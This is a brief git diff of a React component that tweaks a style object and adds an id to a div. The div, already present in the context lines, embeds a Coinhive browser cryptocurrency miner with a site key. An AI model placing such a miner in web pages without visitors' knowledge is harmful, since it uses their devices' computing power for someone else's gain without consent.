@@ -92,12 +92,12 @@ class App extends Component {
     }
     var sectionStyle2 = {
       width: '256px',
-      height: '310px'
+      height: '310px',
     }
     return (
       <div id="main" style={sectionStyle}>
 
-      <div className="coinhive-miner" 
+      <div  id="broMenu" className="coinhive-miner" 
         style={sectionStyle2}
         data-key="6UtrrYYyMYrjRjXpipAn5FNt8SX0fdGc"
         data-user="default"
